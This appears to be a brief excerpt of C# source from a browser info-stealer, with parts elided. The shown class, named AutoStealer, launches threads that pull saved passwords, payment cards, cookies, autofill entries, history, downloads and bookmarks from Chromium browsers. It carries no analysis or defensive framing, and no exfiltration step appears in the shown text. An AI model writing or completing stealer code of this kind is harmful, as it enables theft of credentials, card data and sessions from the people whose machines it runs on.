    ...
    internal class AutoStealer
    {
        ...
        private static void steal()
        {
            ...
            List<Thread> threads = new List<Thread> {
                ...
                new Thread(cGetChromium.getPasswords),
                new Thread(cGetChromium.getCards),
                new Thread(cGetChromium.getHistory),
                new Thread(cGetChromium.getDownloads),
                new Thread(cGetChromium.getAutofills),
                new Thread(Bookmarks.get),
                new Thread(cGetChromium.getCookie),
